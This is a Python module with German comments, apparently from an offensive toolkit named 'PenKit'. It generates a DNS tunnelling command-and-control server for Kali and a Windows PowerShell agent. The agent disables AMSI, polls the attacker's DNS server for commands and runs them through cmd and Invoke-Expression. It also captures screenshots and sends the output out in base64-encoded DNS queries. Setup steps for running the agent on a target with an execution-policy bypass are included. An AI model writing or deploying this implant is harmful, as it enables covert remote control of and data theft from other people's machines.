"""
DNS C2 Tunneling — Command & Control über DNS-Anfragen.

Warum DNS C2?
  Port 53 (DNS) ist in FAST ALLEN Netzwerken erlaubt — auch in gesperrten
  Unternehmensnetzwerken, Hotels, öffentlichen WLANs.
  Firewalls und Proxies blockieren oft Port 80/443/4444 — niemals Port 53.

Architektur:
  Kali (DNS-Server)  ←→  Windows Agent (stellt DNS-Anfragen)

  Agent → fragt z.B.  cmdjwVkH23.penkit.local   (encoded command result)
  Kali  → antwortet mit TXT-Record: Y2QgQzpcICAmIGlwY29uZmln  (encoded command)

Unterstützt:
  1. DNS TXT Record C2    — einfach, funktioniert überall
  2. DNS Subdomain C2     — subtiler, split große Daten in Subdomains
  3. ICMP Tunneling       — Bonus: C2 über ping-Pakete

Installation:
  pip3 install dnslib --break-system-packages

WICHTIG: Für externe Nutzung braucht man eine eigene Domain mit NS-Record
         der auf Kali zeigt. Für LAN-Tests reicht lokale DNS-Auflösung.
"""

from __future__ import annotations
import asyncio
import base64
import hashlib
import os
import random
import string
import time
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir

runner = CommandRunner()


# ── DNS Server (Kali-Seite) ───────────────────────────────────────────────────

DNS_SERVER_PY = '''#!/usr/bin/env python3
"""
PenKit DNS C2 Server — läuft auf Kali.
Empfängt Agent-Output via DNS-Anfragen, sendet Commands via TXT-Records.
"""
import base64
import hashlib
import socket
import threading
import queue
import time

try:
    from dnslib import DNSRecord, DNSHeader, QTYPE, RR, TXT, A
    from dnslib.server import DNSServer, BaseResolver
except ImportError:
    print("[!] dnslib nicht installiert: pip3 install dnslib --break-system-packages")
    exit(1)

DOMAIN    = "{domain}"  # z.B. penkit.local
SECRET    = "{secret}"  # Shared Secret für Authentifizierung
CMD_QUEUE = queue.Queue()
OUT_FILE  = "{out_file}"

def encode_cmd(cmd: str) -> str:
    return base64.b64encode(cmd.encode()).decode()

def decode_data(b64: str) -> str:
    try:
        return base64.b64decode(b64.encode()).decode(errors="replace")
    except:
        return ""


class C2Resolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        reply = request.reply()

        # Agent schickt: <b64-encoded-data>.<counter>.<DOMAIN>
        if qname.endswith(DOMAIN):
            subdomain = qname[:-len(DOMAIN)-1]
            parts = subdomain.split(".")
            if len(parts) >= 1:
                data = "".join(parts[:-1]) if len(parts) > 1 else parts[0]
                # Daten dekodieren und speichern
                try:
                    decoded = decode_data(data + "=" * (-len(data) % 4))
                    ts = time.strftime("%Y-%m-%d %H:%M:%S")
                    line = f"[{ts}] [{handler.client_address[0]}] {decoded}\\n"
                    print(line, end="")
                    with open(OUT_FILE, "a") as f:
                        f.write(line)
                except:
                    pass

        # Command aus Queue als TXT-Record senden
        if request.q.qtype == QTYPE.TXT:
            try:
                cmd = CMD_QUEUE.get_nowait()
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(encode_cmd(cmd)), ttl=1))
                print(f"[*] Command gesendet: {cmd}")
            except queue.Empty:
                reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(encode_cmd("nop")), ttl=1))
        else:
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=1))

        return reply


def input_thread():
    print("[*] DNS C2 Server läuft. Commands eingeben (Enter zum Senden):")
    print("    Beispiele: shell whoami | ps tasklist | screenshot | exit")
    while True:
        try:
            cmd = input("[cmd> ").strip()
            if cmd:
                CMD_QUEUE.put(cmd)
                print(f"[+] Command in Queue: {cmd}")
        except (EOFError, KeyboardInterrupt):
            break


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--iface", default="0.0.0.0")
    args = p.parse_args()

    resolver = C2Resolver()
    server = DNSServer(resolver, port=args.port, address=args.iface)
    server.start_thread()

    print(f"[+] DNS C2 Server läuft auf {args.iface}:{args.port}")
    print(f"[+] Domain: {DOMAIN}")
    print(f"[+] Output: {OUT_FILE}")
    print(f"[*] Agent-Konfiguration: DOMAIN={DOMAIN}, NS=<diese IP>")
    print()

    t = threading.Thread(target=input_thread, daemon=True)
    t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        server.stop()
        print("\\n[*] DNS C2 Server gestoppt.")
'''


# ── Windows Agent (PS1) ───────────────────────────────────────────────────────

def generate_agent_ps1(
    kali_ip: str,
    domain: str,
    interval: int = 30,
    include_amsi: bool = True,
) -> str:
    """
    Generiert den Windows DNS C2 Agent als PowerShell.

    Der Agent:
    1. Stellt alle N Sekunden eine DNS TXT-Anfrage → empfängt Command
    2. Führt Command aus
    3. Kodiert Ergebnis als Base64
    4. Schickt Result-Chunks als DNS-Anfragen zurück (A-Record Queries)
    """
    v = {k: _r() for k in ["cmd", "result", "b64", "chunks", "c", "i", "ts"]}

    amsi = ""
    if include_amsi:
        amsi = """
# AMSI Bypass
try {
    $a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*AmsiUtils*'}
    $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context*'}
    $b.SetValue($null,0)
} catch {}
"""

    return f"""
{amsi}
# DNS C2 Agent — kommuniziert ausschließlich über DNS Port 53
$dns_server = "{kali_ip}"
$domain     = "{domain}"
$interval   = {interval}

function DNS-Query {{
    param([string]$name, [string]$type="A")
    try {{
        $query = [System.Net.Dns]::GetHostAddresses($name)
    }} catch {{}}
}}

function DNS-TXT-Query {{
    param([string]$fqdn)
    try {{
        # .NET unterstützt kein TXT direkt → nslookup nutzen
        $r = nslookup -type=TXT $fqdn $dns_server 2>&1 | Select-String "text ="
        if ($r) {{
            $raw = ($r -join "") -replace '.*"(.*)".*','$1'
            return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($raw))
        }}
    }} catch {{}}
    return "nop"
}}

function Send-Data {{
    param([string]$data)
    # Aufteilen in 50-Byte Chunks (DNS-Label-Limit)
    $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
    $b64 = $b64 -replace '[/+=]',''  # URL-safe
    $chunks = [regex]::Matches($b64, '.{{1,50}}') | ForEach-Object {{ $_.Value }}
    $counter = 0
    foreach ($chunk in $chunks) {{
        $fqdn = "$chunk.$counter.$domain"
        DNS-Query $fqdn
        $counter++
        Start-Sleep -Milliseconds 100
    }}
}}

function Handle-Command {{
    param([string]$cmd)
    if ($cmd -eq "nop" -or -not $cmd) {{ return }}

    $result = ""
    try {{
        if ($cmd -like "shell *") {{
            $c = $cmd.Substring(6)
            $result = cmd /c $c 2>&1 | Out-String
        }} elseif ($cmd -like "ps *") {{
            $c = $cmd.Substring(3)
            $result = Invoke-Expression $c 2>&1 | Out-String
        }} elseif ($cmd -eq "screenshot") {{
            Add-Type -AssemblyName System.Windows.Forms,System.Drawing
            $bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                                [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            $g = [System.Drawing.Graphics]::FromImage($bmp)
            $g.CopyFromScreen(0,0,0,0,$bmp.Size)
            $ms = [System.IO.MemoryStream]::new()
            $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
            $result = "SCREENSHOT:" + [Convert]::ToBase64String($ms.ToArray())
        }} elseif ($cmd -eq "sysinfo") {{
            $result = "User: $env:USERNAME@$env:COMPUTERNAME | OS: $([System.Environment]::OSVersion) | IP: $((Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address)"
        }} elseif ($cmd -eq "whoami") {{
            $result = whoami /all 2>&1 | Out-String
        }} else {{
            $result = "Unknown command: $cmd"
        }}
    }} catch {{ $result = "Error: $_" }}

    Send-Data $result
}}

# Main Loop
while ($true) {{
    $ts = [int](Get-Date -UFormat %s)
    $fqdn = "cmd.$ts.$domain"
    $command = DNS-TXT-Query $fqdn
    Handle-Command $command
    Start-Sleep -Seconds $interval
}}
"""


def _r(n: int = 8) -> str:
    return "_" + "".join(random.choices(string.ascii_letters, k=n))


# ── Launch-Funktionen ─────────────────────────────────────────────────────────

async def setup_dns_server(
    kali_ip: str,
    domain: str = "penkit.local",
    port: int = 53,
) -> AsyncGenerator[str, None]:
    """Richtet DNS C2 Server ein und startet ihn."""
    out = out_dir("payloads")
    secret = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    out_file = str(out_dir("logs") / "dns_c2_output.txt")

    yield "[*] Bereite DNS C2 Server vor..."

    # Server-Script generieren
    server_script = DNS_SERVER_PY.format(
        domain=domain,
        secret=secret,
        out_file=out_file,
    )
    server_path = str(out / "dns_c2_server.py")
    with open(server_path, "w") as f:
        f.write(server_script)

    yield f"[+] DNS Server Script: {server_path}"
    yield f"[+] Output-Datei: {out_file}"

    # Windows Agent generieren
    yield "[*] Generiere Windows Agent..."
    agent_code = generate_agent_ps1(kali_ip, domain)
    agent_path = str(out / "dns_c2_agent.ps1")
    with open(agent_path, "w") as f:
        f.write(agent_code)
    yield f"[+] Windows Agent: {agent_path}"

    yield ""
    yield "═" * 60
    yield "SETUP ABGESCHLOSSEN"
    yield "═" * 60
    yield ""
    yield "Schritt 1: DNS Server auf Kali starten:"
    yield f"  sudo python3 {server_path} --port {port}"
    yield ""
    yield "Schritt 2: Windows Agent auf Ziel ausführen:"
    yield f"  powershell -ep bypass -File dns_c2_agent.ps1"
    yield ""
    yield f"Schritt 3: Commands über Server-Eingabe senden"
    yield f"  > shell whoami"
    yield f"  > ps tasklist"
    yield f"  > sysinfo"
    yield ""
    yield f"Domain: {domain}"
    yield f"Secret: {secret}"
    yield "─" * 60

    # dnslib prüfen/installieren
    yield "[*] Prüfe dnslib..."
    import shutil
    if shutil.which("python3"):
        async for line in runner.run([
            "python3", "-c", "import dnslib; print('[+] dnslib OK')"
        ]):
            if "OK" in line:
                yield line
            else:
                yield "[!] dnslib nicht installiert"
                yield "[*] Installiere..."
                async for l in runner.run([
                    "pip3", "install", "dnslib", "--break-system-packages", "-q"
                ]):
                    if l.strip():
                        yield f"  {l}"
                yield "[+] dnslib installiert"


async def start_server(
    kali_ip: str,
    domain: str = "penkit.local",
    port: int = 53,
) -> AsyncGenerator[str, None]:
    """Startet den DNS C2 Server direkt."""
    out = out_dir("payloads")
    server_path = str(out / "dns_c2_server.py")

    if not os.path.exists(server_path):
        async for line in setup_dns_server(kali_ip, domain, port):
            yield line

    yield f"[*] Starte DNS C2 Server auf Port {port}..."
    yield "[!] WICHTIG: Port 53 benötigt sudo-Rechte"
    yield "[*] Für Nicht-root: Port > 1024 verwenden (z.B. 5353)"
    yield ""

    import os as _os
    _os.execvp("python3", ["python3", server_path, "--port", str(port)])
